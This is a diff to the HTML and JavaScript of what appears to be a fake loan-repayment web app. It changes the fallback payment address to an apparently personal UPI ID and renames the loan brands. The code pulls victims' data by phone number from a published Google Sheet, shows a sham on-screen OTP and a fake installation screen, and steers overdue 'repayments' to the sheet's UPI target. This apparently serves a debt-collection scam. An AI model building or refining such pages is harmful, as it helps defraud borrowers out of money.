@@ -120,7 +120,7 @@
     .feature-box.orange{border-left:4px solid #FF9800}
     .feature-box.purple{border-left:4px solid #9C27B0}
 
-    /* My Account (unbold look) */
+    /* My Account */
     .summary-card{
       background:linear-gradient(135deg,#0d47a1 0%,#1e66c6 100%);
       border-radius:18px;padding:18px;color:#fff;
@@ -440,15 +440,16 @@
     let SHEET_DATA = {};
     let selectedIndex = 0;
 
-    // ✅ Your Google Sheets CSV (same style as your earlier code)
+    // ✅ Your Google Sheets CSV
     const CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vSqEJvs5Tnz2x1oCo5xOURlss-qdpBeF8Ew2-7wllFw17LU_jaxJ0YF-Gw8ncqUpAru6LfK25HlL__U/pub?gid=0&single=true&output=csv";
 
     // ✅ Fallback only if sheet VPA/UPI is empty
-    const DEFAULT_UPI = "merchant@upi";
+    const DEFAULT_UPI = "rhlrj16-5@okhdfcbank";
 
+    // ✅ Updated names + ensured Cash Bay dueDate exists
     const LOANS = [
       {
-        provider:"Hi Rupee",
+        provider:"Candy Park",
         logoText:"H",
         repayment:41160,
         orderNo:"20140203499",
@@ -461,7 +462,7 @@
         overdueDays:36
       },
       {
-        provider:"Candy Bay",
+        provider:"Cash Bay",
         logoText:"C",
         repayment:45220,
         orderNo:"20140203499",
@@ -476,9 +477,7 @@
     ];
 
     function formatINR(n){ return Number(n || 0).toLocaleString("en-IN"); }
-    function clean(val){
-      return (val ?? "").toString().replace(/"/g,"").trim();
-    }
+    function clean(val){ return (val ?? "").toString().replace(/"/g,"").trim(); }
 
     // ===== CSV FETCH + PARSE =====
     async function fetchGoogleSheetData(){
@@ -536,6 +535,7 @@
     function applyUpiFromSheet(){
       const upiInput = document.getElementById("upi");
       const sheetUpi = clean(currentUserData?.["VPA/UPI"]);
+      // ✅ ALWAYS link VPA/UPI column to UI; fallback only if empty
       upiInput.value = sheetUpi || DEFAULT_UPI;
     }
 
@@ -561,7 +561,7 @@
         clearInterval(interval);
         statusEl.textContent = "Installation Complete!";
         buttonEl.classList.add("show");
-        // ✅ IMPORTANT: DO NOT auto-open login here.
+        // ✅ DO NOT auto-open login
       }, 4000);
     }
 
@@ -588,7 +588,6 @@
         return;
       }
 
-      // ensure data loaded
       if(Object.keys(SHEET_DATA).length === 0){
         errorDiv.textContent = "⏳ Loading data, please wait...";
         errorDiv.style.display = "block";
@@ -604,7 +603,6 @@
       const searchPhone = phoneDigits.slice(-10);
       if(SHEET_DATA[searchPhone]){
         currentUserData = SHEET_DATA[searchPhone];
-
         generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
         document.getElementById("otp-section").style.display = "block";
         document.getElementById("otp-display").textContent = generatedOTP;
@@ -628,9 +626,7 @@
 
         document.getElementById("bottom-nav").classList.add("active");
 
-        // ✅ Always set UPI from sheet
         applyUpiFromSheet();
-
         renderMyAccount();
         showScreen("screen-home");
       }else{
@@ -666,7 +662,6 @@
         showScreen("screen-pending");
       }else if(tab === "payment"){
         document.getElementById("nav-payment").classList.add("active-tab");
-        // ✅ ensure UPI re-applied from sheet whenever payment opens
         applyUpiFromSheet();
         showScreen("screen-payment");
       }
@@ -728,7 +723,6 @@
     function setPaymentAmountFromLoan(idx){
       const l = LOANS[idx];
       document.getElementById("amount").value = l.repayment;
-      // ✅ ALWAYS pull UPI from sheet when setting loan
       applyUpiFromSheet();
     }
 
